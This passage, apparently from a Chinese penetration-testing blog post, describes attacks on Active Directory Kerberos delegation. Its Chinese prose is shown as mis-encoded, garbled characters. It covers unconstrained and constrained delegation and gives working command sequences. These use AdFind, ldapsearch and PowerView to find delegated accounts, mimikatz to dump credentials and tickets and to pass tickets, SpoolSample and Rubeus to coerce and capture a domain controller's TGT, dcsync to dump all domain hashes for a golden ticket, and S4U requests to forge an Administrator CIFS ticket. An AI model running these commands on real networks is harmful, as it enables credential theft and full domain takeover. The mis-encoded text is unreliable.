","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 å®šä¹‰ Identity delegation is a feature of Active Directo ry Federation Services (AD FS) that allows administrator-specified accounts to impersonate users. The account that impersonates the user is called the dele gate This delegation capability is critical for many distributed applications for which there is a series of access control checks that must be made sequentially for each application, database, or service that is in the authorization chain for the originating request Many real-world scenarios exist in which a Web application â€œfront endâ€ must retrieve data from a more secure â€œback endâ€, such as a Web service that is connected to a Microsoft SQL Server database. åŸŸå§”æ´¾æ˜¯å¤§å‹ç½‘ç»œä¸­ç»å¸¸éƒ¨ç½²çš„åº”ç”¨æ¨¡å¼ï¼Œç»™å¤šè·³è®¤è¯å¸¦æ¥å¾ˆå¤§çš„ä¾¿åˆ©ï¼ŒåŒæ—¶ä¹Ÿå¸¦æ¥å¾ˆå¤§çš„å®‰å…¨éšæ‚£ï¼Œåˆ©ç”¨å§”æ´¾å¯è·å–åŸŸç®¡ç†å‘˜æƒé™ï¼Œç”šè‡³åˆ¶ä½œæ·±åº¦éšè—çš„åé—¨ åŸŸå§”æ´¾æ˜¯æŒ‡ï¼Œå°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦å·ï¼Œä½¿å¾—æœåŠ¡è´¦å·èƒ½ä»¥ç”¨æˆ·æƒé™å¼€å±•åŸŸå†…æ´»åŠ¨ã€‚ ä¿¡æ¯ åœ¨åŸŸå†…çš„å¯ä»¥å§”æ´¾çš„è´¦æˆ·æœ‰ä¸¤ç§ä¸€ç§æ˜¯ä¸»æœºè´¦æˆ·ï¼ˆNet Computerï¼‰å¦ä¸€ç§æ˜¯ç”¨ setspn æ‰‹åŠ¨æ·»åŠ çš„æœåŠ¡è´¦æˆ·ï¼ˆNet Userï¼‰ï¼Œä¸ç®¡æ˜¯éçº¦æŸè¿˜æ˜¯çº¦æŸçš„ä¾‹å­æ˜¯ä»¥ä¸»æœºè´¦æˆ·ä¸¾ä¾‹ï¼Œå› ä¸ºç”¨ä¸»æœºè´¦æˆ·æ¥å§”æ´¾çš„ç¯å¢ƒå¥½æ­å¹¶ä¸”ä¾¿äºç†è§£ï¼Œä¸è¿‡æœåŠ¡è´¦æˆ·å’Œä¸»æœºè´¦æˆ·ä»æ”»å‡»å§”æ´¾è¿™ä¸ªè§†è§’æ¥çœ‹æ˜¯ç­‰ä»·çš„ã€‚ æœåŠ¡è´¦å·(Service Account)ï¼ŒåŸŸå†…ç”¨æˆ·çš„ä¸€ç§ç±»å‹ï¼ŒæœåŠ¡å™¨è¿è¡ŒæœåŠ¡æ—¶æ‰€ç”¨çš„è´¦å·ï¼Œå°†æœåŠ¡è¿è¡Œèµ·æ¥å¹¶åŠ å…¥åŸŸã€‚ä¾‹å¦‚ MS SQL Server åœ¨å®‰è£…æ—¶ï¼Œä¼šåœ¨åŸŸå†…è‡ªåŠ¨æ³¨å†ŒæœåŠ¡è´¦å· SqlServiceAccountï¼Œè¿™ç±»è´¦å·ä¸èƒ½ç”¨äºäº¤äº’å¼ç™»å½•ã€‚ ä¸€ä¸ªåŸŸå†…æ™®é€šç”¨æˆ· jack é€šè¿‡ Kerberos åè®®è®¤è¯åˆ°å‰å° WEB æœåŠ¡åï¼Œå‰å°è¿è¡Œ WEB æœåŠ¡çš„æœåŠ¡è´¦å· websvc æ¨¡æ‹Ÿ(Impersonate)ç”¨æˆ· jackï¼Œä»¥ Kerberos åè®®ç»§ç»­è®¤è¯åˆ°åå°æœåŠ¡å™¨ï¼Œä»è€Œåœ¨åå°æœåŠ¡å™¨ä¸­è·å– jack ç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œå³åŸŸä¸­å•è·³æˆ–è€…å¤šè·³çš„ Kerberos è®¤è¯ã€‚ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 æµç¨‹ åŸŸå†…ç”¨æˆ· jack ä»¥ Kerberos æ–¹å¼è®¤è¯åè®¿é—® Web æœåŠ¡å™¨; Web æœåŠ¡ä»¥ websvc æœåŠ¡è´¦å·è¿è¡Œï¼Œwebsvc å‘ KDC å‘èµ· jack ç”¨æˆ·çš„ç¥¨æ®ç”³è¯·; KDC æ£€æŸ¥ websvc ç”¨æˆ·çš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œåˆ™è¿”å› jack ç”¨æˆ·çš„å¯è½¬å‘ç¥¨æ® TGT; websvc æ”¶åˆ° jack ç”¨æˆ· TGT åï¼Œä½¿ç”¨è¯¥ç¥¨æ®å‘ KDC ç”³è¯·è®¿é—®æ–‡ä»¶æœåŠ¡å™¨çš„æœåŠ¡ç¥¨æ® ST; KDC æ£€æŸ¥ websvc çš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œä¸”ç”³è¯·çš„æ–‡ä»¶æœåŠ¡åœ¨å…è®¸çš„åˆ—è¡¨æ¸…å•ä¸­ï¼Œåˆ™è¿”å›ä¸€ä¸ª jack ç”¨æˆ·è®¿é—®æ–‡ä»¶æœåŠ¡çš„æˆæƒç¥¨æ® ST; websvc æ”¶åˆ°çš„ jack ç”¨æˆ·çš„æˆæƒç¥¨æ® ST åï¼Œå¯è®¿é—®æ–‡ä»¶æœåŠ¡ï¼Œå®Œæˆå¤šè·³è®¤è¯ã€‚ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 å§”æ´¾ç±»å‹ åŸŸå†…å§”æ´¾ä¸»è¦æœ‰ 3 ç§åº”ç”¨æ–¹å¼: ä¸€æ˜¯éçº¦æŸæ€§å§”æ´¾(Unconstrained Delegation)ï¼ŒæœåŠ¡è´¦å·å¯ä»¥è·å–æŸç”¨æˆ·çš„ TGTï¼Œä»è€ŒæœåŠ¡è´¦å·å¯ä½¿ç”¨è¯¥ TGTï¼Œæ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ä»»æ„æœåŠ¡ äºŒæ˜¯çº¦æŸæ€§å§”æ´¾(Constrained Delegation)ï¼Œå³ Kerberos çš„æ‰©å±•åè®® S4U2Proxyï¼ŒæœåŠ¡è´¦å·åªèƒ½è·å–æŸç”¨æˆ·çš„ STï¼Œä»è€Œåªèƒ½æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ç‰¹å®šçš„æœåŠ¡ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 éçº¦æŸå§”æ´¾ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 åŸç† å¦‚æœæŸä¸ªæœåŠ¡ A çš„æœåŠ¡è´¦å· B è¢«è®¾ç½®ä¸ºéçº¦æŸå§”æ´¾ï¼Œå½“ç”¨æˆ· C é€šè¿‡ Kerberos è®¤è¯è®¿é—®æœåŠ¡ A æ—¶ï¼ŒKDC ä¼šæ£€æŸ¥æœåŠ¡è´¦å· B çš„å±æ€§ï¼Œå‘ç°æ˜¯éçº¦æŸæ€§å§”æ´¾æ—¶ï¼ŒKDC ä¼šå°†ç”¨æˆ· C çš„ TGT æ”¾åœ¨ ST ä¸­ï¼Œè¿™æ · B åœ¨éªŒè¯ ST çš„åŒæ—¶è·å–äº† A ç”¨æˆ·çš„ TGTï¼Œä»è€Œå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ· A è®¿é—®ä»»æ„æœåŠ¡ã€‚ å¼€å¯å§”æ´¾åï¼Œåœ¨è¯¥ç”¨æˆ·çš„ userAccountControl å±æ€§ä¼šå¤šå‡ºä¸€ä¸ª flagï¼šWORKSTATION_TRUSTED_FOR_DELEGATION éçº¦æŸå§”æ´¾çš„è®¾ç½®éœ€è¦ SeEnableDelegation ç‰¹æƒï¼Œè¯¥ç‰¹æƒé€šå¸¸ä»…æˆäºˆåŸŸç®¡ç†å‘˜ã€‚ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 å®æˆ˜ 2.2.1 éçº¦æŸå§”æ´¾çš„æŸ¥æ‰¾ 2.2.1.1 adfind æŸ¥è¯¢éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š AdFind.exe -b \"DC=pentest,DC=com\" -f \"(\u0026(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName æŸ¥è¯¢éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š AdFind.exe -b \"DC=pentest,DC=com\" -f \"(\u0026(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName 2.2.1.2 powerview æ³¨ï¼šPowerSploit-dev åˆ†æ”¯ æŸ¥è¯¢é…ç½®éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼šGet-NetUser -Unconstrained -Domain pentest.com æŸ¥è¯¢é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼šGet-domaincomputer -Unconstrained -Domain pentest.com 2.2.1.3 ldapsearch ä¿¡æ¯ éœ€è¦åŸŸå†…ä»»æ„ç”¨æˆ·çš„è´¦å·å¯†ç  æŸ¥è¯¢éçº¦æŸå§”æ´¾çš„æœºå™¨ï¼š ldapsearch -LLL -x -H ldap://172.16.147.130:389 -D \"win7user@pentest.com\" -w \"123456bY\" -b dc=pentest,dc=com \"(\u0026(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName æŸ¥è¯¢éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š ldapsearch -LLL -x -H ldap://172.16.147.130:389 -D \"win7user@pentest.com\" -w \"123456\" -b dc=pentest,dc=com \"(\u0026(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" cn distinguishedName 2.2.2 éçº¦æŸå§”æ´¾çš„åˆ©ç”¨ 2.2.2.1 ç®¡ç†å‘˜æ¨¡æ‹Ÿè®¿é—® ä¿¡æ¯ å®éªŒå‰å»ºè®®æ¸…é™¤å†…å­˜ä¸­çš„ç¥¨æ®ï¼Œmimikatz ä¸‹ï¼škerberos::purge æ¨¡æ‹Ÿç®¡ç†å‘˜è°ƒç”¨éçº¦æŸæ€§å§”æ´¾æœºçš„ smb æœåŠ¡ï¼šnet use \\\\win7\\c$ å›åˆ°éçº¦æŸå§”æ´¾æœºï¼ŒæŸ¥çœ‹ç¥¨æ®(éƒ¨åˆ†æˆªå›¾)ï¼š privilege::debug sekualsa::tickets TGT è¢«æˆªè·ï¼Œæˆ‘ä»¬ç”¨ sekurlas::tickets /export æŠŠç¥¨æ®å¯¼å‡ºæ¥ æ­¤æ—¶æˆ‘ä»¬è®¿é—®åŸŸæ§æ˜¯è¢«æ‹’ç»çš„ï¼š ç„¶å mimikatz é‡Œä½¿ç”¨ kerberos::ptt ç¥¨æ®æ–‡ä»¶å å°†ç¥¨æ®æ³¨å…¥å†…å­˜ï¼š å¯ä»¥æˆåŠŸè®¿é—®ã€‚ å¦‚æœæƒ³æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ WinRM æœåŠ¡æ¥è¿œç¨‹è¿æ¥åŸŸæ§æœåŠ¡å™¨ï¼š Enter-PSSession -ComputerName DC 2.2.2.2 Spooler Printer Bug åœ¨å®æˆ˜ä¸­ï¼Œåªæ˜¯å•çº¯çš„éçº¦æŸå§”æ´¾è¯éœ€è¦ç®¡ç†å‘˜ä¸»åŠ¨è¿æ¥æ¯”è¾ƒé¸¡è‚‹ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨éçº¦æŸå§”æ´¾ + Spooler æ‰“å°æœºæœåŠ¡å¯ä»¥å¼ºåˆ¶æŒ‡å®šçš„ä¸»æœºè¿›è¡Œè¿æ¥ã€‚ åˆ©ç”¨åŸç†ï¼šåˆ©ç”¨ Windows æ‰“å°ç³»ç»Ÿè¿œç¨‹åè®® (MS-RPRN) ä¸­çš„ä¸€ç§æ—§çš„ä½†æ˜¯é»˜è®¤å¯ç”¨çš„æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ï¼ŒåŸŸç”¨æˆ·å¯ä»¥ä½¿ç”¨ MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) æ–¹æ³•å¼ºåˆ¶ä»»ä½•è¿è¡Œäº† Spooler æœåŠ¡çš„è®¡ç®—æœºä»¥é€šè¿‡ Kerberos æˆ– NTLM å¯¹æ”»å‡»è€…é€‰æ‹©çš„ç›®æ ‡è¿›è¡Œèº«ä»½éªŒè¯ã€‚ POCï¼šhttps://github.com/leechristensen/SpoolSample å‘ DC çš„ Spooler æœåŠ¡å‘é€è¯·æ±‚ï¼Œå¼ºåˆ¶å…¶è®¿é—® win7 è¿›è¡Œèº«ä»½éªŒè¯ï¼šSpoolSample.exe DC win7 å¯ä»¥ç”¨ Rubeus æ¥ç›‘å¬ Event ID ä¸º 4624 äº‹ä»¶ï¼Œè¿™æ ·å¯ä»¥ç¬¬ä¸€æ—¶é—´æˆªå–åˆ°åŸŸæ§çš„ï¼Œæ¯éš”ä¸€ç§’ç›‘å¬ä¸€æ¬¡æ¥è‡ª DC çš„ç™»é™†ï¼ˆéœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼‰TGTï¼šRubeus.exe monitor /interval:1 /filteruser:DC$ æ³¨ï¼šRubeus.exe æ•è·åˆ°çš„ TGT æ˜¯ base64 ç¼–ç çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸éœ€è¦è§£ç ï¼ŒRubeus å¯ä»¥ç›´æ¥å°† base64 ç¼–ç çš„ç¥¨æ®ç›´æ¥æ³¨å…¥åˆ°å†…å­˜ä¸­ï¼šRubeus.exe ptt /ticket:base64 å¾—åˆ° TGT ä¹‹åï¼Œåˆ©ç”¨ PTT å°†ç¥¨æ®æ³¨å…¥åˆ°å½“å‰ä¼šè¯åï¼Œå¯ä»¥ç”¨ dcsync å¯¼å‡ºåŸŸæ§ä¸­æ‰€æœ‰ç”¨æˆ·çš„ hashï¼Œç„¶åç”¨ krbtgt ç”¨æˆ·çš„ hash ç”Ÿæˆé»„é‡‘ç¥¨æ®ã€‚ kerberos::ptt xxxx.kirbi lsadump::dcsync /domain:test.local /all /csv ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 çº¦æŸå§”æ´¾ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.1 åŸç† ç”±äºéçº¦æŸå§”æ´¾çš„ä¸å®‰å…¨æ€§ï¼Œå¾®è½¯åœ¨ windows server 2003 ä¸­å¼•å…¥äº†çº¦æŸå§”æ´¾ï¼Œå¯¹ Kerberos åè®®è¿›è¡Œäº†æ‹“å±•ï¼Œå¼•å…¥äº† S4Uï¼Œå…¶ä¸­ S4U æ”¯æŒä¸¤ä¸ªå­åè®®ï¼šService for User to Self (S4U2Self) å’Œ Service for User to Proxy (S4U2proxy)ï¼Œè¿™ä¸¤ä¸ªæ‰©å±•éƒ½å…è®¸æœåŠ¡ä»£è¡¨ç”¨æˆ·ä» KDC è¯·æ±‚ç¥¨è¯ã€‚S4U2self å¯ä»¥ä»£è¡¨è‡ªèº«è¯·æ±‚é’ˆå¯¹å…¶è‡ªèº«çš„ Kerberos æœåŠ¡ç¥¨æ®(ST)ï¼›S4U2proxy å¯ä»¥ä»¥ç”¨æˆ·çš„åä¹‰è¯·æ±‚å…¶å®ƒæœåŠ¡çš„ STï¼Œçº¦æŸå§”æ´¾å°±æ˜¯é™åˆ¶äº† S4U2proxy æ‰©å±•çš„èŒƒå›´ã€‚ S4U2Self å’Œ S4U2proxy çš„è¯·æ±‚è¿‡ç¨‹ï¼ˆå›¾æ¥è‡ªå¾®è½¯æ‰‹å†Œï¼‰ï¼š å…¶ä¸­æ­¥éª¤ 1-4 ä»£è¡¨ S4U2Self è¯·æ±‚çš„è¿‡ç¨‹ï¼Œæ­¥éª¤ 5-10 ä»£è¡¨ S4U2proxy çš„è¯·æ±‚è¿‡ç¨‹ ç”¨æˆ·å‘ service1 å‘å‡ºè¯·æ±‚ã€‚ç”¨æˆ·å·²é€šè¿‡èº«ä»½éªŒè¯ï¼Œä½† service1 æ²¡æœ‰ç”¨æˆ·çš„æˆæƒæ•°æ®ã€‚é€šå¸¸ï¼Œè¿™æ˜¯ç”±äºèº«ä»½éªŒè¯æ˜¯é€šè¿‡ Kerberos ä»¥å¤–çš„å…¶ä»–æ–¹å¼éªŒè¯çš„ã€‚ é€šè¿‡ S4U2self æ‰©å±•ä»¥ç”¨æˆ·çš„åä¹‰å‘ KDC è¯·æ±‚ç”¨äºè®¿é—® service1 çš„ ST1ã€‚ KDC è¿”å›ç»™ Service1 ä¸€ä¸ªç”¨äºç”¨æˆ·éªŒè¯ Service1 çš„ ST1ï¼Œè¯¥ ST1 å¯èƒ½åŒ…å«ç”¨æˆ·çš„æˆæƒæ•°æ®ã€‚ service1 å¯ä»¥ä½¿ç”¨ ST ä¸­çš„æˆæƒæ•°æ®æ¥æ»¡è¶³ç”¨æˆ·çš„è¯·æ±‚ï¼Œç„¶åå“åº”ç”¨æˆ·ã€‚ æ³¨ï¼šå°½ç®¡ S4U2self å‘ service1 æä¾›æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä½† S4U2self ä¸å…è®¸ service1 ä»£è¡¨ç”¨æˆ·å‘å‡ºå…¶ä»–æœåŠ¡çš„è¯·æ±‚ï¼Œè¿™æ—¶å€™å°±è½®åˆ° S4U2proxy å‘æŒ¥ä½œç”¨äº† ç”¨æˆ·å‘ service1 å‘å‡ºè¯·æ±‚ï¼Œservice1 éœ€è¦ä»¥ç”¨æˆ·èº«ä»½è®¿é—® service2 ä¸Šçš„èµ„æºã€‚ service1 ä»¥ç”¨æˆ·çš„åä¹‰å‘ KDC è¯·æ±‚ç”¨æˆ·è®¿é—® service2 çš„ ST2 å¦‚æœè¯·æ±‚ä¸­åŒ…å« PACï¼Œåˆ™ KDC é€šè¿‡æ£€æŸ¥ PAC çš„ç­¾åæ•°æ®æ¥éªŒè¯ PAC ï¼Œå¦‚æœ PAC æœ‰æ•ˆæˆ–ä¸å­˜åœ¨ï¼Œåˆ™ KDC è¿”å› ST2 ç»™ service1ï¼Œä½†å­˜å‚¨åœ¨ ST2 çš„ cname å’Œ crealm å­—æ®µä¸­çš„å®¢æˆ·ç«¯èº«ä»½æ˜¯ç”¨æˆ·çš„èº«ä»½ï¼Œè€Œä¸æ˜¯ service1 çš„èº«ä»½ã€‚ service1 ä½¿ç”¨ ST2 ä»¥ç”¨æˆ·çš„åä¹‰å‘ service2 å‘é€è¯·æ±‚ï¼Œå¹¶åˆ¤å®šç”¨æˆ·å·²ç”± KDC è¿›è¡Œèº«ä»½éªŒè¯ã€‚ service2 å“åº”æ­¥éª¤ 8 çš„è¯·æ±‚ã€‚ service1 å“åº”ç”¨æˆ·å¯¹æ­¥éª¤ 5 ä¸­çš„è¯·æ±‚ã€‚ å½“è¢«è®¾ç½®ä¸ºçº¦æŸæ€§å§”æ´¾æ—¶ï¼Œå…¶ userAccountControl å±æ€§åŒ…å« TRUSTED_TO_AUTH_FOR_DELEGATION(T2A4D)ï¼Œä¸” msDS-AllowedToDelegateTo å±æ€§ä¼šè¢«è®¾ç½®ä¸ºå“ªäº›åè®® ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼Œçº¦æŸå§”æ´¾ä¸éœ€è¦å…¶å®ƒç”¨æˆ·ä¸»åŠ¨è¯·æ±‚å¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·ã€‚å½“æ‹¿ä¸‹ä¸€ä¸ªé…ç½®çº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼Œå°±å¯ä»¥æ‹¿ä¸‹é…ç½®å¯¹åº”å§”æ´¾ä¸»æœºçš„æƒé™ã€‚ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.2 å®æˆ˜ 3.2.1 çº¦æŸå§”æ´¾çš„æŸ¥æ‰¾ 3.2.1.1 adfind æŸ¥è¯¢çº¦æŸå§”æ´¾çš„ä¸»æœºï¼š AdFind.exe -b \"DC=pentest,DC=com\" -f \"(\u0026(samAccountType=805306369)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto æŸ¥è¯¢çº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š AdFind.exe -b \"DC=pentest,DC=com\" -f \"(\u0026(samAccountType=805306368)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto 3.2.1.2 powerview æŸ¥è¯¢çº¦æŸå§”æ´¾çš„ä¸»æœºï¼š Get-DomainComputer -TrustedToAuth -Domain test.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto æŸ¥è¯¢çº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š Get-DomainUser â€“TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl 3.2.1.3 ldapsearch æŸ¥è¯¢çº¦æŸå§”æ´¾çš„æœºå™¨ï¼š ldapsearch -LLL -x -H ldap://IP:389 -D \"user@pentest.com\" -w \"123456\" -b dc=pentest,dc=com \"(\u0026(samAccountType=805306369)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto æŸ¥è¯¢çº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š ldapsearch -LLL -x -H ldap://IP:389 -D \"user@pentest.com\" -w \"123456\" -b dc=pentest,dc=com \"(\u0026(samAccountType=805306368)(msds-allowedtodelegateto=*))\" cn distinguishedName msds-allowedtodelegateto 3.2.2 çº¦æŸå§”æ´¾çš„åˆ©ç”¨ 3.2.2.1 å¸¸è§æƒ…å†µ å·²çŸ¥åœ¨çº¦æŸå§”æ´¾çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç”¨æˆ·åªèƒ½è·å–æŸä¸ªç”¨æˆ·æˆ–è€…ä¸»æœºçš„æœåŠ¡ STï¼Œåªèƒ½ç”¨æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ç‰¹å®šçš„æœåŠ¡ï¼Œæ˜¯æ— æ³•è·å–ç”¨æˆ·çš„ TGT çš„ï¼Œå¦‚æœèƒ½å¤Ÿè·å¾—åˆ°å¼€å¯äº†çº¦æŸå§”æ´¾çš„æœåŠ¡çš„ç”¨æˆ·çš„æ˜æ–‡å¯†ç æˆ–è€… hash å°±å¯ä»¥ä¼ªé€  S4U çš„è¯·æ±‚ï¼Œè¿›è€Œä¼ªé€ æœåŠ¡ç”¨æˆ·ä»¥ä»»æ„è´¦æˆ·çš„æƒé™è®¿é—®æœåŠ¡çš„ STã€‚ å…ˆæŠ“å‡ºä¸»æœºè´¦æˆ·çš„ NTLM Hash å€¼ï¼š mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit ç”³è¯· TGTï¼š ä¿¡æ¯ å¦‚æœæ‹¥æœ‰æœåŠ¡ç”¨æˆ·ç™»å½•çš„ä¸»æœºæƒé™ï¼Œå¯ä»¥ç”¨ mimikatz ç›´æ¥ä»å†…å­˜ä¸­æŠŠæœåŠ¡ç”¨æˆ·çš„ TGT dump å‡ºæ¥ï¼Œå¯ä»¥è·³è¿‡ç”³è¯· TGT è¿™ä¸ªæ­¥éª¤ï¼Œç›´æ¥ç”¨ mimikatz å¯¼å‡º TGTï¼š mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit NTLM Hash å’Œå¯†ç éƒ½å¯ä»¥ï¼š tgt::ask /user:win7$ /domain:pentest.com /ntlm:\u003cæŠ“å–åˆ°çš„å“ˆå¸Œ\u003e tgt::ask /user:win7$ /domain:pentest.com /password:12345 é€šè¿‡ TGTï¼Œè¯·æ±‚ä¸€å¼ ä»¥ Administrator ç”¨æˆ·èº«ä»½è®¿é—®å¯¹åº”æœåŠ¡ 2ï¼ˆDC çš„ cifs æœåŠ¡ï¼‰çš„ STï¼štgs::s4u /tgt:TGT_win7$@PENTEST.COM_krbtgt~pentest.com@PENTEST.COM.kirbi /user:administrator@pentest.com /service:cifs/dc.pentest.com S4U2Self è·å–åˆ°çš„ ST1 ä»¥åŠ S4U2Proxy è·å–åˆ°çš„ DC CIFS æœåŠ¡çš„ ST2 ä¼šä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹ï¼š ç”¨ mimikatz å°† ST2 å¯¼å…¥å½“å‰ä¼šè¯å³å¯ï¼š kerberos::ptt TGS_administrator@pentest.com@PENTEST.COM_cifs~dc.pentest.com@PENTEST.COM.kirbi 3.2.2.2 SPN è®¾ç½®å½±å“å¯¹åº”ç¥¨æ® å½“å§”æ´¾çš„æƒé™ä¸æ˜¯ cifs æ—¶ï¼Œå¦‚ time æƒé™ï¼Œå¦‚ä½•è¿›ä¸€æ­¥æµ‹è¯•ï¼Ÿ é€šè¿‡åœ¨ hex æ¨¡å¼ä¸‹ä¿®æ”¹ ST2ï¼Œå°† time ä¿®æ”¹ä¸º cifsï¼Œå³å¯é€šè¿‡ smbexec æ‰§è¡Œå‘½ä»¤ã€‚ 